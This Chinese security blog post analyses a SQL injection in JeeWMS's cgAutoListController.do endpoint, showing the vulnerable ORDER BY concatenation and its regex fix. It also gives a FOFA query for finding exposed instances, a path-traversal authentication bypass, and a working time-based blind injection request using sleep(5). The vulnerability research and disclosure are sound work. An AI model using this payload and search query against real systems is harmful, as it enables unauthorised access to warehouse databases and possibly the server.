---
title: "JeeWMS cgAutoListController.do SQL注入漏洞"
source: https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html
asset_dir: assets/jeewms-cgautolistcontroller.do-sql注入漏洞
---

# JeeWMS cgAutoListController.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/25 08:28
- 1170浏览
- [0评论](#comment)
- 30分钟阅读

深入探索

软件

鉴权

身份验证

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS cgAutoListController.do 接口处存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞，未经身份验证的恶意攻击者利用[SQL注入](https://mrxn.net/tag/SQL注入)漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

低于 20250422 版本

# fofa语法

> `body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"`

# 漏洞分析

深入探索

计算机安全

编码转换工具

安全研究工具

直接看 `src/main/java/org/jeecgframework/web/cgform/service/impl/autolist/CgTableServiceImpl.java` diff 修复前后差异

[![JeeWMS cgAutoListController.do SQL注入漏洞](images/img-001-18d59dd548e3.webp)](https://image.mrxn.net/32ed6f87438240ebab0c348137abfef3.webp)

可以很明显看到修复之前的是直接将 `sort` 与 `order` 两个参数直接拼接到sql语句中

```
@Override
    public List<Map<String, Object>> querySingle(String table, String field, Map params,
                                                 String sort, String order, int page, int rows) {
        StringBuilder sqlB = new StringBuilder();
        dealQuerySql(table,field,params,sqlB);
        if(!StringUtil.isEmpty(sort)&& !StringUtil.isEmpty(order)){
            sqlB.append(" ORDER BY "+sort+" "+ order);
        }
        List<Map<String, Object>> result = commonService.findForJdbcParam(sqlB
                .toString(), page, rows);
        return result;
    }
```

深入探索

网络安全培训

代码安全审计

网络安全会议

造成[sql注入漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，而修复后的增加了`sanitizeSort` 方法对传入的 `sort` 使用正则进行检查，如果 `sort` 不满足正则 `[a-zA-Z0-9_]+` 则直接返回 `null` ，而 `sanitizeOrder` 方法则检查 `order` 只能是 `ASC` 或者 `DESC` ，避免了SQL注入。

而 此方法的使用有三处地点，如下图所示

[![JeeWMS cgAutoListController.do SQL注入漏洞](images/img-002-e838be7e5e38.webp)](https://image.mrxn.net/b91b5b5d46ac4a2f9b18cacd6d7275ca.webp)

其中最后的 ExcelTempletController 不存在 `sort` 与 `order` 的调用，为固定的 `null` ，只有 `src/main/java/org/jeecgframework/web/cgform/controller/autolist/CgAutoListController.java` 有如下调用

```
if(isTree && treeId !=null) {
            //防止下级数据太大，最大只取500条
            result=cgTableService.querySingle(table, field.toString(), params,sort,order, 1, 500);
        }else {
            result=cgTableService.querySingle(table, field.toString(), params,sort,order, p,r );
        }
```

因此根据 JeeWMS 框架的特点，访问URL也就是： `/jeewms/cgAutoListController.do` (注意 jeewms 不一定存在)，结合前面的[权限绕过分析文章](https://mrxn.net/jswz/JeeWMS-commonController-upload-rce.html)，也可以是 `/jeewms/rest/../cgAutoListController.do`

# 漏洞复现

```
POST /jeewms/rest/../cgAutoListController.do?datagrid&configId=ba_del_mode&field=id,create_name,create_by,create_date,update_name,update_by,update_date,sys_org_code,sys_company_code,del_mode_code,del_mode_name, HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 160
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8081
Referer: http://localhost:8081/jeewms/cgAutoListController.do?list&id=ba_del_mode&clickFunctionId=8a7ba3345d93bb87015d95e0118500af
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

del_mode_code=&order=desc%2C%28select%2Afrom%28select%2Bsleep%285%29union%2F%2A%2A%2Fselect%2B1%29a%29&page=1&rows=10&searchfield=del_mode_code&sort=create_date
```

[![JeeWMS cgAutoListController.do SQL注入漏洞](images/img-003-945af2a342cc.webp)](https://image.mrxn.net/d40d6b91ec7a4a25a920dd519743f22b.webp)

成功延时 5 秒

# 参考

- `https://gitee.com/erzhongxmu/JEEWMS/issues/IC2IV4`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
